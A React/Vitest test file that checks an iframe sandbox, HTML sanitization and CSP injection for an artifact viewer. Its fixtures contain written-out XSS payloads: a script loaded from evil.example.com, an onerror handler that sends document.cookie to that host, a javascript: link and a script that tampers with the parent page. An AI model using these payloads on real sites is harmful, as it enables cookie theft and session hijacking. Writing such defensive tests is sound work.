import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { SandboxedIframe } from '../components/ArtifactViewer/SandboxedIframe';
import { sanitizeArtifactHtml } from '../utils/sanitize';

describe('SandboxSecurity Tests (Evaluator Focus Area: Artifact Security)', () => {
  it('omits allow-same-origin and strictly keeps allow-scripts in sandbox attribute', () => {
    const testContent = '<!DOCTYPE html><html><body><h1>Safe Content</h1></body></html>';
    render(<SandboxedIframe content={testContent} title="Sandbox Attribute Test" />);

    const iframe = screen.getByTitle('Sandbox Attribute Test') as HTMLIFrameElement;
    const sandboxAttr = iframe.getAttribute('sandbox') || '';
    const sandboxTokens = sandboxAttr.split(/\s+/).filter(Boolean);

    // CRITICAL SECURITY INVARIANT:
    // "allow-same-origin" must NEVER be included (prevents parent DOM / cookie / storage access)
    expect(sandboxTokens).not.toContain('allow-same-origin');
    expect(sandboxTokens).toContain('allow-scripts');
  });

  it('strips external script tags and malicious data exfiltration links via DOMPurify', () => {
    const maliciousPayload = `
      <!DOCTYPE html>
      <html>
      <head>
        <title>Malicious Exfiltration Attempt</title>
        <script src="https://evil.example.com/stealer.js"></script>
        <link rel="stylesheet" href="https://evil.example.com/exfiltrate.css">
      </head>
      <body>
        <a href="javascript:alert(document.cookie)">Click me</a>
        <img src="x" onerror="fetch('https://evil.example.com/steal?data=' + document.cookie)">
        <h1>Benign Dashboard</h1>
      </body>
      </html>
    `;

    const sanitized = sanitizeArtifactHtml(maliciousPayload);

    // External script source must be stripped
    expect(sanitized).not.toContain('evil.example.com/stealer.js');
    expect(sanitized).not.toContain('<script src=');

    // javascript: pseudo-protocol must be stripped
    expect(sanitized).not.toContain('javascript:alert');

    // onerror inline event handler must be stripped
    expect(sanitized).not.toContain('onerror=');
    expect(sanitized).not.toContain('fetch(');

    // Safe HTML content remains
    expect(sanitized).toContain('Benign Dashboard');
  });

  it('injects or enforces restrictive Content-Security-Policy blocking all external network connections', () => {
    const plainHtml = `
      <!DOCTYPE html>
      <html>
      <head>
        <title>ROI Calculator</title>
      </head>
      <body>
        <div id="calculator">Interactive Widget</div>
      </body>
      </html>
    `;

    render(<SandboxedIframe content={plainHtml} title="CSP Verification Test" />);

    const iframe = screen.getByTitle('CSP Verification Test') as HTMLIFrameElement;
    const srcDoc = iframe.getAttribute('srcdoc') || '';

    // Verify CSP meta tag is injected
    expect(srcDoc).toContain('http-equiv="Content-Security-Policy"');
    // Verifies network blocking: default-src 'none' blocks fetch, XHR, WebSocket, EventSource
    expect(srcDoc).toContain("default-src 'none'");
    expect(srcDoc).toContain("style-src 'unsafe-inline'");
    expect(srcDoc).toContain("script-src 'unsafe-inline'");
    expect(srcDoc).toContain("img-src data:");
  });

  it('prevents parent DOM tampering and cookie theft attempts from within sandbox', () => {
    const escapePayload = `
      <!DOCTYPE html>
      <html>
      <body>
        <script>
          try {
            window.parent.document.title = 'Hacked';
            window.parent.localStorage.setItem('compromised', 'true');
          } catch (e) {
            // Blocked by opaque origin
          }
        </script>
      </body>
      </html>
    `;

    render(<SandboxedIframe content={escapePayload} title="Parent DOM Tamper Test" />);

    const iframe = screen.getByTitle('Parent DOM Tamper Test') as HTMLIFrameElement;
    const sandboxAttr = iframe.getAttribute('sandbox') || '';

    // Because allow-same-origin is omitted, the document is in an opaque origin
    expect(sandboxAttr).not.toContain('allow-same-origin');
  });
});
